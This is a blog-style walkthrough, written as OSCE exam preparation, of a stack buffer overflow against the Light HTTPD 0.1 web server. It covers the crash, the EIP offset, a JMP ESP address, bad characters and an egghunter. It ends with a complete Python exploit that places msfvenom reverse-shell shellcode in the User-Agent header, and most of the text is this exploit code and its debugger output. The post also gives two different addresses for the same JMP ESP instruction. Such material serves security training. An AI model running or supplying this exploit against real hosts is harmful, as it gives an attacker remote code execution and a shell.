---
layout: post
title:  "Light HTTPD 0.1 egghunter"
date:   2020-1-14 00:11:00 +0000
categories: Windows
---


Im writing this walkthrough as preparation for OSCE and to follow my windows exploitation series notes.
<br>
Once installed and running on the remote system, we can verify the port is open with a simple nmap scan, looking for port 3000.

```
PORT     STATE SERVICE
3000/tcp open  ppp
```

We can import our simple http long name length overflow exploit skeleton and start working from there.

{% highlight python %}
import socket
rhost = "192.168.9.147"
rport = 3000

buffer = "A" *500

req = "GET " + buffer + "HTTP/1.1\r\n"
req +="User-Agent: Mozilla/5.0\r\n"
req += "AAAA" + "\r\n"
req += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[!] Connecting"
s.connect((rhost,rport))
print "[!] Connected"
s.send(req)
print "[!] Sent"
s.close
{% endhighlight %}



We send the buffer of 500 as an initial check and receive our crash in immunity.

```
[23:36:40] Access violation when executing [41414141] - use Shift+F7/F8/F9 to pass exception to program
```
<br>
We can set a `max_size` variable to 500 just to cap our payloads for future.

Next we can use mona to create a unique pattern of 500 in length. (`!mona pc 500`)

Copy the pattern out of the text file in the immunity directory and throw it into our exploit as a standalone buffer to send. Once we send this, the attached app will crash and give us our offset to EIP with the pattern.

```
[23:41:35] Access violation when executing [36694135] - use Shift+F7/F8/F9 to pass exception to program
```

Use mona again to get the offset from our EIP value. (`!mona po 36694135`)

This returns our value in red.

```
- Pattern 5Ai6 (0x36694135) found in cyclic pattern at position 257
```
<br>
We dont actually overwrite a SEH buffer so we should be able to plant a usual JMP ESP instruction here. We start by searching for available modules within the application with `!mona modules`. Then we can search for our relevant instruction within the program. `!mona find -s "\xFF\xE4"`, will search the application for relevant JMP ESP instructions. We find quite a lot within the app, i chose one from USER32.DLL (0x77d5b913). Add all these things down in our exploit skeleton.

{% highlight python %}
Offset = 257
jmp = "\x4f\x4e\xd5\x77"
{% endhighlight %}



Next is something i should have maybe done before selecting the address but in this case it doesnt matter. We need to find the bad characters that will mess up execution of the egghunter and/or shellcode. First use mona to create a byte array of every hex character. `!mona bytearray` will create a file in the immunity directory with an array of our hex. Copy this out and add it to our skeleton to send with the offset buffer. Send the string array that will crash our app. Once the application is crashed, use mona to compare the bytes in memory to the ones in the file. `!mona compare -f <immunity_dir> -a 004116818` where -f is the path and -a is the memory address where the dump of characters start. (Use the stack window in immunity to find the buffer then characters). Mona will then spit out our characters that cause issues, for this app the bad chars are `\x00\x0a\x0d`, these characters are pretty usual for an app of this type, they are a null byte and a CRLF sequence. Next we should create our egghunter, we can do this in mona yet again `!mona egg -b \x00\x0a\x0d`. Copy out the egghunter (and note the egg) and put it in the exploit. That should be every thing we need from immunity at this point. Next we can create our shellcode with msfvenom.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.9.135 LPORT=443 -f python -b \x00\x0a\x0d
```
<br>
Add that to the exploit and piece it all together. We need our crash ("A"*offset) + jumpaddress + egghunter + padding, then we need egg(x2) + shellcode somewhere else in memory. In this case, the user-agent portion of the http GET request will work.

Add it all together as below and run a nc listener with config the same as the shellcode was created with.

{% highlight python %}
import socket
rhost = "192.168.9.147"
rport = 3000

#buffer = "A" * 500 #inital crash

#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

#buffer = "A" * 257
#bad chars - \x00\x0a\x0d
#buffer += ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
#"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
#"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
#"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
#"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
#"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
#"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
#"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.9.135 LPORT=443 -f python -b \x00\x0a\x0d
buf =  ""
buf += "\xd9\xcc\xb8\x9e\x95\xb2\x89\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x52\x83\xea\xfc\x31\x42\x13\x03\xdc\x86\x50"
buf += "\x7c\x1c\x40\x16\x7f\xdc\x91\x77\x09\x39\xa0\xb7\x6d"
buf += "\x4a\x93\x07\xe5\x1e\x18\xe3\xab\x8a\xab\x81\x63\xbd"
buf += "\x1c\x2f\x52\xf0\x9d\x1c\xa6\x93\x1d\x5f\xfb\x73\x1f"
buf += "\x90\x0e\x72\x58\xcd\xe3\x26\x31\x99\x56\xd6\x36\xd7"
buf += "\x6a\x5d\x04\xf9\xea\x82\xdd\xf8\xdb\x15\x55\xa3\xfb"
buf += "\x94\xba\xdf\xb5\x8e\xdf\xda\x0c\x25\x2b\x90\x8e\xef"
buf += "\x65\x59\x3c\xce\x49\xa8\x3c\x17\x6d\x53\x4b\x61\x8d"
buf += "\xee\x4c\xb6\xef\x34\xd8\x2c\x57\xbe\x7a\x88\x69\x13"
buf += "\x1c\x5b\x65\xd8\x6a\x03\x6a\xdf\xbf\x38\x96\x54\x3e"
buf += "\xee\x1e\x2e\x65\x2a\x7a\xf4\x04\x6b\x26\x5b\x38\x6b"
buf += "\x89\x04\x9c\xe0\x24\x50\xad\xab\x20\x95\x9c\x53\xb1"
buf += "\xb1\x97\x20\x83\x1e\x0c\xae\xaf\xd7\x8a\x29\xcf\xcd"
buf += "\x6b\xa5\x2e\xee\x8b\xec\xf4\xba\xdb\x86\xdd\xc2\xb7"
buf += "\x56\xe1\x16\x17\x06\x4d\xc9\xd8\xf6\x2d\xb9\xb0\x1c"
buf += "\xa2\xe6\xa1\x1f\x68\x8f\x48\xda\xfb\x70\x24\xed\x7c"
buf += "\x18\x37\xed\x83\x62\xbe\x0b\xe9\x84\x97\x84\x86\x3d"
buf += "\xb2\x5e\x36\xc1\x68\x1b\x78\x49\x9f\xdc\x37\xba\xea"
buf += "\xce\xa0\x4a\xa1\xac\x67\x54\x1f\xd8\xe4\xc7\xc4\x18"
buf += "\x62\xf4\x52\x4f\x23\xca\xaa\x05\xd9\x75\x05\x3b\x20"
buf += "\xe3\x6e\xff\xff\xd0\x71\xfe\x72\x6c\x56\x10\x4b\x6d"
buf += "\xd2\x44\x03\x38\x8c\x32\xe5\x92\x7e\xec\xbf\x49\x29"
buf += "\x78\x39\xa2\xea\xfe\x46\xef\x9c\x1e\xf6\x46\xd9\x21"
buf += "\x37\x0f\xed\x5a\x25\xaf\x12\xb1\xed\xdf\x58\x9b\x44"
buf += "\x48\x05\x4e\xd5\x15\xb6\xa5\x1a\x20\x35\x4f\xe3\xd7"
buf += "\x25\x3a\xe6\x9c\xe1\xd7\x9a\x8d\x87\xd7\x09\xad\x8d"


egg = "\x77\x30\x30\x74" #w00t
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter +="\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


max_size = 500
offset = 257


# user32.dll jmp esp 77D54E4F
jmp = "\x4f\x4e\xd5\x77"


buffer = "A" * offset
buffer += jmp
buffer += "\x90" * 8
buffer += egghunter
buffer += "C" * (len(buffer))

req = "GET " + buffer + "HTTP/1.1\r\n"
req +="User-Agent: "+egg+egg+buf+"\r\n"
req += "\r\n"
req += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[!] Connecting"
s.connect((rhost,rport))
print "[!] Connected"
s.send(req)
print "[!] Sent"
s.close
{% endhighlight %}

Thats it! Ive left all the notes and comments in the exploit in case i missed something out in the article.
